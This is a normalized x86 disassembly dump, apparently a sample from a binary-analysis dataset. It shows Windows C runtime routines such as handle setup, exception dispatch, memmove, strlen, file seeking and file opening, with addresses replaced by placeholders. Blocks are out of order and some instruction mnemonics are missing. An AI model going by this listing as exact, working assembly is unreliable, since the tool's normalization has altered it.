inc eax
cmp [ eax ] bx
jne r-xdata
push ebp
push edi
push esi
call sub_40cb30
add esp 0xc
xor esi esi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40c7f4
pop ecx
mov [ esp + 0x10 ] ebx
sub_410206
sub esp 0x44
push ebx
push ebp
push esi
push edi
push 0x100
call sub_40c823
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] 0x20
lea eax [ esi + 0x100 ]
push 0x1b
call sub_40cae3
pop ecx
lea eax [ esp + 0x10 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ esp + 0x42 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
mov [ esi + 0x5 ] 0xa
mov eax [ rw-data ]
add esi 0x8
add eax 0x100
jmp r-xdata
xor ebx ebx
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
cmp esi eax
jae r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov esi [ eax ]
lea ebp [ eax + 0x4 ]
mov eax 0x800
cmp esi eax
lea ebx [ esi + ebp ]
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + ebx * 8 ] 0xffffffff
lea esi [ eax + ebx * 8 ]
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] esi
jge r-xdata
mov esi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor edi edi
test esi esi
jle r-xdata
mov edi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
mov eax [ ebx ]
cmp eax 0xffffffff
je r-xdata
mov esi [ rw-data ]
add [ rw-data ] 0x20
mov [ edi ] eax
lea ecx [ eax + 0x100 ]
cmp eax 0x3
jne r-xdata
inc edi
inc ebp
add ebx 0x4
cmp edi esi
jl r-xdata
mov cl [ ebp ]
test cl 0x1
je r-xdata
add edi 0x4
cmp [ rw-data ] esi
jl r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov ecx [ edi ]
add eax 0x8
add ecx 0x100
jmp r-xdata
or [ esi + 0x4 ] 0x8
jmp r-xdata
test cl 0x8
jne r-xdata
push 0x100
call sub_40c823
test eax eax
pop ecx
je r-xdata
jmp r-xdata
cmp eax ecx
jae r-xdata
mov eax edi
mov ecx edi
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + ecx * 8 ]
mov ecx [ ebx ]
mov [ eax ] ecx
mov cl [ ebp ]
mov [ eax + 0x4 ] cl
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
sub_4103b4
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_40c1c6
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_40c184
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_40c1c6
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_40c25a
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_410494
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_4104cd
mov eax [ rw-data ]
pop ecx
test eax eax
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_4104cd
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_4104cd
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rw-data
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rw-data ]
jne r-xdata
add eax 0x8
inc ecx
cmp eax rw-data
jl r-xdata
pop esi
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp edx [ eax ]
je r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rw-data ]
push 0x0
push eax
push [ esi ]
call sub_410c80
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp edx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_410c80
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_4119d0
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_4119d0
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_4119e0
lea eax [ ebp - 0xa0 ]
push rw-data
push eax
call sub_4119e0
push [ esi + rw-data ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_4119e0
push 0x12010
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_41207c
add esp 0x2c
pop edi
jmp r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_410c80
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_412110
add esp 0x10
sub_410620
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push eax
call sub_4106bc
test eax eax
pop ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
push esi
call [ rw-data ]
jmp r-xdata
jmp sub_40d78c
pop esi
retn 0x4
sub_4106e0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je r-xdata
or al al
je r-xdata
inc ecx
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_410770
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4107d0 ]
jmp [ ecx * 4 + jump_table_41084c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4108b8 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4108b8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_410a50 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_410958 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_410a50 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4108b8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4108b8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4108b8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_410a50 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_410a50 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_410a50 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_410a50 ]
sub_410abc
mov eax [ esp + 0x4 ]
push ebx
cmp eax [ rw-data ]
push esi
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov ecx eax
mov esi eax
sar ecx 0x5
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
shl esi 0x3
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x1
je r-xdata
push eax
call sub_411124
cmp eax 0xffffffff
pop ecx
jne r-xdata
push [ esp + 0x18 ]
push 0x0
push [ esp + 0x1c ]
push eax
call [ SetFilePointer@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
or eax 0xffffffff
mov eax [ edi ]
and [ eax + esi + 0x4 ] 0xfd
lea eax [ eax + esi + 0x4 ]
mov eax ebx
jmp r-xdata
push eax
call sub_40ec6a
pop ecx
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_410b56
inc [ rw-data ]
push 0x1000
call sub_40c823
pop ecx
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_410bc0
mov eax [ rw-data ]
push esi
push 0x14
test eax eax
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_40cec8
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor ecx ecx
mov eax rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_40cec8
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov edx [ rw-data ]
mov [ ecx + edx ] eax
add eax 0x20
add ecx 0x4
cmp eax rw-data
jl r-xdata
xor edx edx
mov ecx rw-data
push 0x1a
call sub_40cae3
pop ecx
or [ ecx ] 0xffffffff
test eax eax
jne r-xdata
mov eax edx
mov esi edx
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rw-data ]
mov eax [ eax + esi * 8 ]
cmp eax 0xffffffff
je r-xdata
pop esi
retn
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_410c80
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_410cfb
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
retn
lea ecx [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push ecx
push 0x0
push [ rw-data ]
push eax
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja r-xdata
mov [ rw-data ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x1
mov [ eax ] cl
pop eax
pop ebp
retn
pop ebp
retn
sub_410d70
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_410de0
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_410e55
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push r--data
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_40c910
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_40ce70
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
sub_410f9e
push ebx
push esi
push edi
or ebx 0xffffffff
xor edi edi
xor esi esi
mov ecx rw-data
mov esi 0x100
push esi
call sub_40c823
test eax eax
pop ecx
je r-xdata
lea edx [ eax + 0x100 ]
pop edi
mov eax ebx
pop esi
pop ebx
retn
add [ rw-data ] 0x20
lea ecx [ edi * 4 + rw-data ]
lea edx [ eax + 0x100 ]
mov [ ecx ] eax
add ecx 0x4
inc edi
add esi 0x20
cmp ecx rw-data
jl r-xdata
test [ eax + 0x4 ] 0x1
je r-xdata
shl edi 0x5
mov ebx edi
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov edx [ ecx ]
add eax 0x8
add edx esi
jmp r-xdata
mov eax [ ecx ]
test eax eax
je r-xdata
jmp r-xdata
or [ eax ] 0xffffffff
sub eax [ ecx ]
sar eax 0x3
add eax esi
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
add eax 0x8
jmp r-xdata
cmp eax edx
jae r-xdata
cmp eax edx
jae r-xdata
sub_411033
mov eax [ esp + 0x4 ]
push esi
cmp eax [ rw-data ]
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
mov ecx eax
mov esi eax
sar ecx 0x5
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
shl esi 0x3
mov ecx [ edi ]
cmp [ ecx + esi ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ esp + 0x14 ]
jne r-xdata
mov eax [ edi ]
mov [ eax + esi ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_4110aa
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
mov eax ecx
mov esi ecx
sar eax 0x5
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ edi ]
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub ecx eax
je r-xdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_411124
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + eax * 8 + 0x4 ] 0x1
lea eax [ ecx + eax * 8 ]
je r-xdata
mov eax [ eax ]
retn
sub_411161
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
mov [ rw-data ] 0x9
or eax 0xffffffff
mov ecx eax
mov edx eax
sar ecx 0x5
and edx 0x1f
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + edx * 8 + 0x4 ] 0x1
je r-xdata
push eax
call sub_411124
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
retn
mov [ rw-data ] eax
test eax eax
je r-xdata
sub_4111b8
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
test cl 0x80
push edi
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x18 ] ebx
je r-xdata
and [ ebp - 0x1 ] 0x0
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push 0x3
mov eax ecx
pop esi
and eax esi
sub eax ebx
je r-xdata
test ch 0x40
jne r-xdata
mov eax 0x8000
test eax ecx
jne r-xdata
mov [ ebp - 0xc ] 0x80000000
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
cmp eax 0x20
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
dec eax
je r-xdata
cmp ecx 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
cmp eax 0x30
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x10
je r-xdata
mov [ ebp - 0xc ] 0xc0000000
jmp r-xdata
mov [ rw-data ] 0x16
mov [ rw-data ] ebx
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx 0x600
je r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
cmp ecx ebx
je r-xdata
mov edx 0x700
mov eax 0x400
and ecx edx
mov edi 0x100
cmp ecx eax
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
cmp eax 0x40
jne r-xdata
or eax 0xffffffff
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x14 ]
test cl 0x80
jne r-xdata
mov [ ebp - 0x8 ] 0x5
jmp r-xdata
cmp ecx edx
je r-xdata
mov eax [ ebp + 0xc ]
mov esi 0x80
test edi eax
je r-xdata
cmp ecx edi
je r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test ah 0x10
je r-xdata
or esi 0x4000000
or [ ebp - 0xa ] 0x1
push 0x1
pop esi
jmp r-xdata
mov [ ebp - 0x8 ] 0x4
jmp r-xdata
cmp ecx 0x200
je r-xdata
test al 0x20
je r-xdata
or esi edi
cmp ecx 0x300
jne r-xdata
test al 0x10
je r-xdata
or esi 0x8000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
call sub_410f9e
mov ebx eax
or edi 0xffffffff
cmp ebx edi
jne r-xdata
or esi 0x10000000
push 0x0
push esi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi edi
je r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x18
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call sub_40ec6a
pop ecx
push esi
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov eax edi
jmp r-xdata
cmp eax 0x2
jne r-xdata
push esi
call [ CloseHandle@IAT ]
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
push esi
push ebx
call sub_411033
